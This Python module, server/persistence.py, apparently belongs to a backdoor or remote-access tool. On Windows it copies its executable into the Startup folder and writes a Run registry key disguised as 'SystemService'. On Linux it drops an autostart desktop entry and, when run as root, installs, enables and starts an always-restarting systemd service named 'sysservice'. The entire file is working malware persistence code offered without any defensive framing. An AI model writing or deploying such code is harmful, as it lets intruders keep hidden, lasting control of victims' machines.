# server/persistence.py
import sys
import os
import shutil


class Persistence:
    @staticmethod
    def add_to_startup_windows():
        if sys.platform != "win32":
            return False

        try:
            import winreg
            # 复制程序到AppData目录
            app_path = sys.executable
            startup_path = os.path.join(
                os.getenv('APPDATA'),
                'Microsoft',
                'Windows',
                'Start Menu',
                'Programs',
                'Startup'
            )
            shutil.copy2(app_path, startup_path)

            # 添加注册表启动项
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(
                key,
                "SystemService",  # 启动项名称
                0,
                winreg.REG_SZ,
                app_path
            )
            winreg.CloseKey(key)
            return True
        except Exception as e:
            return str(e)

    @staticmethod
    def add_to_startup_linux():
        if sys.platform == "win32":
            return False

        try:
            # 获取当前用户的home目录
            home = os.path.expanduser("~")

            # 创建自启动目录（如果不存在）
            autostart_dir = os.path.join(home, ".config", "autostart")
            if not os.path.exists(autostart_dir):
                os.makedirs(autostart_dir)

            # 创建desktop文件
            desktop_file = os.path.join(autostart_dir, "sysservice.desktop")
            content = f"""[Desktop Entry]
Type=Application
Name=SystemService
Exec={sys.executable} {os.path.abspath(sys.argv[0])} server
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
"""
            with open(desktop_file, 'w') as f:
                f.write(content)

            # 设置权限
            os.chmod(desktop_file, 0o755)

            # 尝试创建系统服务（需要root权限）
            if os.geteuid() == 0:  # 如果是root用户
                service_content = f"""[Unit]
Description=System Service
After=network.target

[Service]
ExecStart={sys.executable} {os.path.abspath(sys.argv[0])} server
Restart=always
User={os.getenv('SUDO_USER', os.getenv('USER'))}

[Install]
WantedBy=multi-user.target
"""
                service_file = '/etc/systemd/system/sysservice.service'
                try:
                    with open(service_file, 'w') as f:
                        f.write(service_content)
                    os.system('systemctl daemon-reload')
                    os.system('systemctl enable sysservice.service')
                    os.system('systemctl start sysservice.service')
                except Exception as e:
                    print(f"创建系统服务失败: {e}")

            return True
        except Exception as e:
            return str(e)

    @staticmethod
    def add_to_startup():
        """根据操作系统选择合适的持久化方法"""
        if sys.platform == "win32":
            return Persistence.add_to_startup_windows()
        else:
            return Persistence.add_to_startup_linux()